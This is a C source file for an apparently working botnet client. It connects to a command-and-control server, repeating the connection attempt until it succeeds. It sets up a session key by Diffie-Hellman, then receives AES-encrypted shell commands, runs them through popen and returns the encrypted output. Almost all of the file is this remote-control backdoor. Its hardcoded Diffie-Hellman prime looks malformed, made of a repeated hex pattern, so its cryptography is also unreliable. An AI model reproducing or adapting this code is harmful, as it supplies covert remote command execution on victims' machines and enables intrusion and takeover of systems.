// bot.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/bn.h>

#define C2_IP "127.0.0.1"
#define C2_PORT 8888
#define BUFFER_SIZE 4096

// Глобальный ключ (установится после DH)
unsigned char session_key[32]; // AES-256

// Выполнение команды и возврат результата
char* exec_cmd(const char* cmd) {
    FILE* pipe = popen(cmd, "r");
    if (!pipe) return NULL;

    char* output = malloc(BUFFER_SIZE);
    if (!output) { pclose(pipe); return NULL; }
    output[0] = '\0';

    char buffer[512];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        strncat(output, buffer, BUFFER_SIZE - strlen(output) - 1);
    }
    pclose(pipe);
    return output;
}

// Расшифровка AES-CBC
int aes_decrypt(unsigned char* ciphertext, int len, unsigned char* key, unsigned char* iv, unsigned char* plaintext) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    int plen = 0, flen = 0;

    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_DecryptUpdate(ctx, plaintext, &plen, ciphertext, len);
    EVP_DecryptFinal_ex(ctx, plaintext + plen, &flen);
    EVP_CIPHER_CTX_free(ctx);

    return plen + flen;
}

// Шифрование AES-CBC
int aes_encrypt(unsigned char* plaintext, int len, unsigned char* key, unsigned char* iv, unsigned char* ciphertext) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    int clen = 0, flen = 0;

    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, ciphertext, &clen, plaintext, len);
    EVP_EncryptFinal_ex(ctx, ciphertext + clen, &flen);
    EVP_CIPHER_CTX_free(ctx);

    return clen + flen;
}

// Diffie-Hellman: генерация ключей
void dh_key_exchange(int sock) {
    BIGNUM *p, *g, *a, *A, *B;
    BN_CTX *ctx = BN_CTX_new();
    unsigned char secret_key[32];

    p = BN_new(); g = BN_new(); a = BN_new(); A = BN_new(); B = BN_new();

    // Параметры DH (стандартные)
    BN_hex2bn(&p, "B10B8F96A080E01DDE92DE5EAE5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D5D");
    BN_set_word(g, 2);

    // Приватный ключ a
    BN_rand_range(a, p);
    // Открытый ключ A = g^a mod p
    BN_mod_exp(A, g, a, p, ctx);

    // Отправляем A
    char A_str[256];
    BN_bn2hex(A, A_str);
    send(sock, A_str, strlen(A_str), 0);

    // Получаем B
    char B_str[256];
    recv(sock, B_str, sizeof(B_str), 0);
    BN_hex2bn(&B, B_str);

    // Секрет = B^a mod p
    BN_mod_exp(B, B, a, p, ctx);
    int len = BN_bn2bin(B, secret_key);
    memset(session_key, 0, 32);
    memcpy(session_key, secret_key, len < 32 ? len : 32);

    BN_free(p); BN_free(g); BN_free(a); BN_free(A); BN_free(B); BN_CTX_free(ctx);
}

int main() {
    int sock;
    struct sockaddr_in server;
    unsigned char buffer[BUFFER_SIZE], decrypted[BUFFER_SIZE], encrypted[BUFFER_SIZE + 16];
    unsigned char iv[16];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr(C2_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);

    printf("Подключение к C2...\n");
    while (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
        sleep(5);
    }

    // Обмен ключами
    dh_key_exchange(sock);

    printf("Ключ установлен. Ожидание команд...\n");

    while (1) {
        // Получаем зашифрованную команду: [IV][CIPHERTEXT]
        int n = recv(sock, buffer, BUFFER_SIZE, 0);
        if (n <= 16) continue;

        memcpy(iv, buffer, 16);
        int decrypted_len = aes_decrypt(buffer + 16, n - 16, session_key, iv, decrypted);
        decrypted[decrypted_len] = '\0';

        // Выполняем команду
        char* result = exec_cmd((char*)decrypted);
        if (result) {
            // Шифруем ответ
            unsigned char resp_iv[16];
            RAND_bytes(resp_iv, 16);
            int encrypted_len = aes_encrypt((unsigned char*)result, strlen(result), session_key, resp_iv, encrypted + 16);
            memcpy(encrypted, resp_iv, 16);

            send(sock, encrypted, encrypted_len + 16, 0);
            free(result);
        }
    }

    close(sock);
    return 0;
}